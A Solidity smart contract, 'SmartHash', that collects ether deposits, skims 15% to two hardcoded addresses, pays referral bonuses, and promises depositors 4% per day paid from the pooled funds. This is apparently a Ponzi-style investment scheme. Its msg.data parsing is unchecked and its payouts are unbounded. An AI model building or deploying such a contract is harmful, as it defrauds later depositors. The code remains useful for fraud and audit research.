1 pragma solidity ^0.4.25;
2 
3 library SafeMath {
4   function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
5     if (_a == 0) {
6       return 0;
7     }
8     c = _a * _b;
9     assert(c / _a == _b);
10     return c;
11   }
12 
13   function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
14     return _a / _b;
15   }
16 
17   function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
18     assert(_b <= _a);
19     return _a - _b;
20   }
21 
22   function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
23     c = _a + _b;
24     assert(c >= _a);
25     return c;
26   }
27 }
28 
29 contract SmartHash {
30 	using SafeMath for uint256;
31 
32 	address public constant admAddress = 0xb5a885c796DbD4656345551cc41d3E8844ac8c04;
33 	address public constant advAddress = 0xd0396aAEcb5547776852aB8682Ba72E1209b536d;
34 
35 	mapping (address => uint256) deposited;
36 	mapping (address => uint256) withdrew;
37 	mapping (address => uint256) refearned;
38 	mapping (address => uint256) blocklock;
39 
40 	uint256 public totalDepositedWei = 0;
41 	uint256 public totalWithdrewWei = 0;
42 
43 	function() payable external {
44 		uint256 admRefPerc = msg.value.mul(5).div(100);
45 		uint256 advPerc = msg.value.mul(10).div(100);
46 
47 		advAddress.transfer(advPerc);
48 		admAddress.transfer(admRefPerc);
49 
50 		if (deposited[msg.sender] != 0) {
51 			address investor = msg.sender;
52 			uint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);
53 			investor.transfer(depositsPercents);
54 
55 			withdrew[msg.sender] += depositsPercents;
56 			totalWithdrewWei = totalWithdrewWei.add(depositsPercents);
57 		}
58 
59 		address referrer = bytesToAddress(msg.data);
60 		if (referrer > 0x0 && referrer != msg.sender) {
61 			referrer.transfer(admRefPerc);
62 
63 			refearned[referrer] += admRefPerc;
64 		}
65 
66 		blocklock[msg.sender] = block.number;
67 		deposited[msg.sender] += msg.value;
68 
69 		totalDepositedWei = totalDepositedWei.add(msg.value);
70 	}
71 
72 	function userDepositedWei(address _address) public view returns (uint256) {
73 		return deposited[_address];
74     }
75 
76 	function userWithdrewWei(address _address) public view returns (uint256) {
77 		return withdrew[_address];
78     }
79 
80 	function userDividendsWei(address _address) public view returns (uint256) {
81 		return deposited[_address].mul(4).div(100).mul(block.number-blocklock[_address]).div(5900);
82     }
83 
84 	function userReferralsWei(address _address) public view returns (uint256) {
85 		return refearned[_address];
86     }
87 
88 	function bytesToAddress(bytes bys) private pure returns (address addr) {
89 		assembly {
90 			addr := mload(add(bys, 20))
91 		}
92 	}
93 }